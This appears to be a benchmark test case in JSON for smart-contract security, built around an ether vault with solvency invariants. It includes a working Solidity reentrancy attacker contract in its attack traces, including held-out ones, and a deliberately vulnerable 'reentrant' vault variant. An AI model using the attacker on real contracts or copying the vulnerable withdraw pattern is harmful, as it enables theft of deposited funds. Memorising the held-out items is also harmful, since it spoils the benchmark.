@@ -1,0 +1,249 @@
+{
+  "input": {
+    "id": "CorpusVault",
+    "intent": "Depositors can deposit ether and withdraw their own balance at any time. The vault must always hold enough ether to pay every depositor their recorded balance, even against malicious callers and contracts.",
+    "contract_source": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.28;\ncontract Vault {\n    mapping(address => uint256) public balanceOf;\n    uint256 public totalDeposits;\n    function deposit() external payable {\n        balanceOf[msg.sender] += msg.value;\n        totalDeposits += msg.value;\n    }\n    function withdraw() external {\n        uint256 amount = balanceOf[msg.sender];\n        require(amount > 0);\n        balanceOf[msg.sender] = 0;\n        totalDeposits -= amount;\n        (bool ok,) = msg.sender.call{value: amount}(\"\");\n        require(ok);\n    }\n}\n",
+    "approved_assumptions": []
+  },
+  "environment": {
+    "deployments": [
+      {
+        "name": "main",
+        "contract_name": "Vault",
+        "constructor_arguments": [],
+        "account": 0,
+        "value_wei": "0"
+      }
+    ],
+    "setup": [
+      {
+        "account": 1,
+        "target": "main",
+        "function": "deposit()",
+        "arguments": [],
+        "value_wei": "100",
+        "advance_seconds": 0
+      }
+    ]
+  },
+  "probes": [
+    {
+      "kind": "view",
+      "label": "VictimBalance",
+      "target": "main",
+      "function": "balanceOf(address)",
+      "arguments": [
+        "$account:1"
+      ]
+    },
+    {
+      "kind": "view",
+      "label": "Total",
+      "target": "main",
+      "function": "totalDeposits()",
+      "arguments": []
+    },
+    {
+      "kind": "balance",
+      "label": "Held",
+      "target": "main"
+    }
+  ],
+  "requirements": [
+    {
+      "id": "TotalBacked",
+      "scope": "intent",
+      "property_id": "",
+      "requirement": "Held ether covers recorded balances.",
+      "intent_quote": "The vault must always hold enough ether to pay every depositor their recorded balance",
+      "step_scope": "each",
+      "predicate": {
+        "op": "le",
+        "args": [
+          {
+            "ref": "Total"
+          },
+          {
+            "ref": "Held"
+          }
+        ]
+      },
+      "origin": {
+        "version": 1,
+        "source": "open",
+        "rationale": "Corpus ground truth."
+      }
+    },
+    {
+      "id": "VictimBacked",
+      "scope": "intent",
+      "property_id": "",
+      "requirement": "An existing depositor stays fully backed.",
+      "intent_quote": "The vault must always hold enough ether to pay every depositor their recorded balance",
+      "step_scope": "each",
+      "predicate": {
+        "op": "le",
+        "args": [
+          {
+            "ref": "VictimBalance"
+          },
+          {
+            "ref": "Held"
+          }
+        ]
+      },
+      "origin": {
+        "version": 1,
+        "source": "open",
+        "rationale": "Corpus ground truth."
+      }
+    }
+  ],
+  "seeds": [
+    {
+      "description": "deposit then withdraw",
+      "trace": {
+        "version": "transaction-trace-v2",
+        "attacker_source": "",
+        "deployments": [],
+        "actions": [
+          {
+            "account": 2,
+            "target": "main",
+            "function": "deposit()",
+            "arguments": [],
+            "value_wei": "30",
+            "advance_seconds": 0
+          },
+          {
+            "account": 2,
+            "target": "main",
+            "function": "withdraw()",
+            "arguments": [],
+            "value_wei": "0",
+            "advance_seconds": 0
+          }
+        ]
+      },
+      "expected_success_actions": [
+        0,
+        1
+      ]
+    }
+  ],
+  "heldout_seeds": [
+    {
+      "description": "existing depositor withdraws, redeposits, withdraws",
+      "trace": {
+        "version": "transaction-trace-v2",
+        "attacker_source": "",
+        "deployments": [],
+        "actions": [
+          {
+            "account": 1,
+            "target": "main",
+            "function": "withdraw()",
+            "arguments": [],
+            "value_wei": "0",
+            "advance_seconds": 0
+          },
+          {
+            "account": 1,
+            "target": "main",
+            "function": "deposit()",
+            "arguments": [],
+            "value_wei": "5",
+            "advance_seconds": 0
+          },
+          {
+            "account": 1,
+            "target": "main",
+            "function": "withdraw()",
+            "arguments": [],
+            "value_wei": "0",
+            "advance_seconds": 0
+          }
+        ]
+      },
+      "expected_success_actions": [
+        0,
+        1,
+        2
+      ]
+    }
+  ],
+  "attacks": [
+    {
+      "name": "reenter-once",
+      "trace": {
+        "version": "transaction-trace-v2",
+        "attacker_source": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.28;\ninterface IVault { function deposit() external payable; function withdraw() external; }\ncontract Attacker {\n    IVault public vault; uint256 public depth; uint256 public limit;\n    constructor(address target, uint256 reentries) { vault = IVault(target); limit = reentries; }\n    function attack() external payable { vault.deposit{value: msg.value}(); vault.withdraw(); }\n    receive() external payable { if (depth < limit) { depth += 1; vault.withdraw(); } }\n}\n",
+        "deployments": [
+          {
+            "name": "attacker",
+            "contract_name": "Attacker",
+            "constructor_arguments": [
+              "$deployment:main",
+              "1"
+            ],
+            "account": 3,
+            "value_wei": "0"
+          }
+        ],
+        "actions": [
+          {
+            "account": 3,
+            "target": "attacker",
+            "function": "attack()",
+            "arguments": [],
+            "value_wei": "10",
+            "advance_seconds": 0
+          }
+        ]
+      }
+    }
+  ],
+  "heldout_attacks": [
+    {
+      "name": "reenter-three-times",
+      "trace": {
+        "version": "transaction-trace-v2",
+        "attacker_source": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.28;\ninterface IVault { function deposit() external payable; function withdraw() external; }\ncontract Attacker {\n    IVault public vault; uint256 public depth; uint256 public limit;\n    constructor(address target, uint256 reentries) { vault = IVault(target); limit = reentries; }\n    function attack() external payable { vault.deposit{value: msg.value}(); vault.withdraw(); }\n    receive() external payable { if (depth < limit) { depth += 1; vault.withdraw(); } }\n}\n",
+        "deployments": [
+          {
+            "name": "attacker",
+            "contract_name": "Attacker",
+            "constructor_arguments": [
+              "$deployment:main",
+              "3"
+            ],
+            "account": 3,
+            "value_wei": "0"
+          }
+        ],
+        "actions": [
+          {
+            "account": 3,
+            "target": "attacker",
+            "function": "attack()",
+            "arguments": [],
+            "value_wei": "20",
+            "advance_seconds": 0
+          }
+        ]
+      }
+    }
+  ],
+  "variants": [
+    {
+      "name": "safe",
+      "source": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.28;\ncontract Vault {\n    mapping(address => uint256) public balanceOf;\n    uint256 public totalDeposits;\n    function deposit() external payable {\n        balanceOf[msg.sender] += msg.value;\n        totalDeposits += msg.value;\n    }\n    function withdraw() external {\n        uint256 amount = balanceOf[msg.sender];\n        require(amount > 0);\n        balanceOf[msg.sender] = 0;\n        totalDeposits -= amount;\n        (bool ok,) = msg.sender.call{value: amount}(\"\");\n        require(ok);\n    }\n}\n",
+      "safe": true
+    },
+    {
+      "name": "reentrant",
+      "source": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.28;\ncontract Vault {\n    mapping(address => uint256) public balanceOf;\n    uint256 public totalDeposits;\n    function deposit() external payable {\n        balanceOf[msg.sender] += msg.value;\n        totalDeposits += msg.value;\n    }\n    function withdraw() external {\n        uint256 amount = balanceOf[msg.sender];\n        require(amount > 0);\n        (bool ok,) = msg.sender.call{value: amount}(\"\");\n        require(ok);\n        balanceOf[msg.sender] = 0;\n        totalDeposits -= amount;\n    }\n}\n",
+      "safe": false
+    }
+  ]
+}
